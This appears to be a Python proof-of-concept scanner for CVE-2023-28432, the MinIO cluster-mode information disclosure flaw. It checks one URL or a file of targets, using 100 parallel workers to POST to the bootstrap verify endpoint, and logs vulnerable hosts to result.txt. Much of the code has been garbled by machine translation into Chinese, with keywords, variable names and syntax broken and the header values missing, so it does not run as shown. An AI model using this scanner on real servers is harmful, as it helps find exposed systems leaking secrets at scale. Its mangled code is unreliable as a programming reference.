导入系统,请求,时间、argparse再保险、线程
多处理。虚拟导入池

def横幅():
Test = ”“”
.___  ___.  __  .__   __.  __        ______   
|   \/   | |  | |  \ |  | |  |      /  __  \  
|  \  /  | |  | |   \|  | |  |     |  |  |  | 
|  |\/|  | |  | |  . `  | |  |     |  |  |  | 
|  |  |  | |  | |  |\   | |  `----.|  `--'  | 
|__|  |__| |__| |__| \__| |_______| \______/                                               
                            version:1.1.0
                            author:huale                                    
”“”
打印(测试)

def 主要():
横幅()
    parser = argparse.ArgumentParser(description="CVE-2023-28432 MinIO集群模式 信息泄露漏洞")
解析器。add_argument('-u'，'——url'，dest='url'，type=str,help='请输入链接')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
args = parser.parse_args（）

如果参数。Url而不是args.file:
        poc(args.url)
Elif不是参数。Url和args.file:
Url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
对于fp.readlines()中的url:
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
url_list mp.map (poc)
        mp.close()
mp.join（）
其他:
f”Uage: \ n \ t python3

def poc(目标):
    payload_url = '/minio/bootstrap/v1/verify'
Url = target payload_url
Headers = {
“用户代理”
“接受”
“接收语言”
“内容类型”
    }

    try:
        res = requests.post(url=url,headers=headers,timeout=5)
        # print(res.text)
        if res.status_code == 200 and "MinioEn" in res.text:
            print(f"[+]该网站存在信息泄露漏洞，url为{target}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在信息泄露漏洞，url为{target}")

    except Exception as e:
        print(f"[*]该网站无法访问，url为{target}")

if __name__ == '__main__':
    main()
